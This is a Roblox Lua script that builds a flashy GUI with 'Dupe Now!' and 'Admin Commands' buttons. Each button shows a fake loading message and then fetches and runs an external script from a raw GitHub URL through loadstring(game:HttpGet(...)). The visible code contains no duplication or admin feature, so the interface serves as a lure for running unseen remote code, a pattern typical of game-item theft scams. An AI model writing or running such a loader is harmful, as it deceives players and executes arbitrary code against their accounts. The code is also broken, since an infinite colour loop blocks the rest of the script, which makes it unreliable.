-- LocalScript in StarterPlayerScripts or StarterGui

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MyGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main GUI Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Function to create RGB lighting effect
local function createRGBLighting(frame)
    while true do
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- RGB transition from blue to red
            wait(0.05)
        end
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(255 - i, i, 0) -- RGB transition from red to green
            wait(0.05)
        end
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(0, 255 - i, i) -- RGB transition from green to blue
            wait(0.05)
        end
    end
end

-- Create the buttons
local button1 = Instance.new("TextButton")
button1.Size = UDim2.new(0.8, 0, 0.2, 0)
button1.Position = UDim2.new(0.1, 0, 0.2, 0)
button1.Text = "Dupe Now!"
button1.TextColor3 = Color3.fromRGB(255, 255, 255)
button1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
button1.BorderSizePixel = 0
button1.Font = Enum.Font.SourceSans -- Default font
button1.Parent = mainFrame

local button2 = Instance.new("TextButton")
button2.Size = UDim2.new(0.8, 0, 0.2, 0)
button2.Position = UDim2.new(0.1, 0, 0.6, 0)
button2.Text = "Admin Commands"
button2.TextColor3 = Color3.fromRGB(255, 255, 255)
button2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
button2.BorderSizePixel = 0
button2.Font = Enum.Font.SourceSans -- Default font
button2.Parent = mainFrame

-- Apply RGB lighting effect to buttons
createRGBLighting(button1)
createRGBLighting(button2)

-- Animation for buttons on hover
local function animateButton(button)
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end)

    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end)
end

animateButton(button1)
animateButton(button2)

-- Function to create a loading screen
local function createLoadingScreen(text)
    local loadingScreen = Instance.new("Frame")
    loadingScreen.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
    loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
    loadingScreen.Parent = screenGui

    -- Create a loading label
    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(1, 0, 0.1, 0)
    loadingLabel.Position = UDim2.new(0, 0, 0.45, 0)
    loadingLabel.Text = text
    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingLabel.TextScaled = true
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.Font = Enum.Font.SourceSans -- Default font
    loadingLabel.Parent = loadingScreen

    -- Create a loading circle
    local loadingCircle = Instance.new("Frame")
    loadingCircle.Size = UDim2.new(0.1, 0, 0.1, 0)
    loadingCircle.Position = UDim2.new(0.5, -25, 0.5, -25)
    loadingCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingCircle.Parent = loadingScreen

    -- Animate the loading circle
    for i = 1, 40 do
        loadingCircle.Rotation = loadingCircle.Rotation + 9 -- Rotate 9 degrees each frame
        wait(0.1) -- Wait for 0.1 seconds for each frame of the animation
    end

    loadingScreen:Destroy() -- Remove loading screen after animation
end

-- Button click event
local function onButtonClick(button, loadingText)
    button.MouseButton1Click:Connect(function()
        -- Create the loading screen
        createLoadingScreen(loadingText)

        -- Load the external script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
        end)

        if not success then
            warn("Failed to execute script: " .. err)
        end
    end)
end

-- Connect button click events
onButtonClick(button1, "Finding Low Server Please Wait.")
onButtonClick(button2, "Rejoining Server Please Do Not Close Roblox!")
